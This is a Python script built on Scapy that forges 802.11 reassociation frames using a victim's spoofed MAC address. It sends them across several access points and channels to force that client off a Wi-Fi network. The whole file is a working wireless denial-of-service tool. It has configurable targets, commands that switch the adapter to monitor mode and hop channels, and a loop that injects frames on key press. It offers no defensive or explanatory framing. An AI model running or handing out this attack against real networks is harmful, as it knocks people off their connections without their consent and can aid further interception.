from scapy.all import *
import time
from binascii import a2b_hex
import sys

## This script only works on Linux systems with Scapy installed
## The script will inject Reassoc packets into the wifi network
## using the victim's MAC address. This will force the victim
## to leave the network.
## Some variables need to be changed for this script to work:
## iface, aps, SSID, and client:

# Wifi interface to use for injection, the adapter must support packet injection, and should already be
# in monitor mode, if not use airmon-ng to enable monitor mode
# CHANGE THIS
iface = 'wlan0mon'

# List of BSSID's of AP's and corresponding channels to use, they should all be in range of the wifiadapter.
# More AP's will make the chance of success greater
# CHANGE THIS
aps = [ ['ff:ff:ff:ff:ff:ff', '1'], 
		['ff:ff:ff:ff:ff:ff', '6'],
		['ff:ff:ff:ff:ff:ff', '11']]

# SSID the client is using and to attack
# CHANGE THIS
SSID = ''

# The MAC address of the victim to kick of the network.
# CHANGE THIS
client = 'ff:ff:ff:ff:ff:ff'

# BSSID of previous MAC address when roaming with reassoc, this shouldn't matter and can be all ff's
curapmac = 'ff:ff:ff:ff:ff:ff'

# Ensure monitor mode is on
print(os.popen('iwconfig %s mode monitor' % iface).read())

# These parameters are from Wireshark, taken from a captured reassoc package
# Assoc will work here as well
reassoc = Dot11ReassoReq(current_AP = curapmac, listen_interval = 1, cap=0x1110)
tag = Dot11Elt(ID=0, info = (SSID), len=len(SSID))
rates = Dot11Elt(ID=1, info = a2b_hex('8c129824b048606c'), len = 8)
power = Dot11Elt(ID=33, info = a2b_hex('0816'), len = 2)
RSN = Dot11Elt(ID=48, len=38, info=a2b_hex('0100000fac040100000fac040100000fac010000010071bcb9a8f711a2e7b349fd897b9f191b'))
RM = Dot11Elt(ID=70, len=5, info=a2b_hex('7310910004'))
Class = Dot11Elt(ID=59, len=14, info=a2b_hex('79515354797a7b7c7d7e7f808182'))
HT = Dot11Elt(ID=45, len=26, info=a2b_hex('210113ff') + b''.join([b'\x00' for i in range(22)]))
vendor = Dot11Elt(ID=221, len=7, info=a2b_hex('0050f202000100'))
vendor2 = Dot11Elt(ID=221, len=8, info=a2b_hex('8cfdf00101020100'))

# Let user choose when to inject package, on key press all BSSID's will be targeted with a short delay
# between package injections
while 1:
	input("Press enter")
	for mac in aps:
		ret = "Error"		
		while "Error" in ret:
			ret = os.popen('iwconfig %s channel %s' % (iface, mac[1])).read()
		print("kicking " + client + " off with " + mac[0] + " on channel " + mac[1])
		frame = RadioTap()/Dot11(type=0, subtype=2, addr1=mac[0],addr2=client, addr3=mac[0])/reassoc/tag/rates/power/RSN/RM/Class/HT/vendor/vendor2
		sendp(frame, iface=iface)
		time.sleep(0.5)

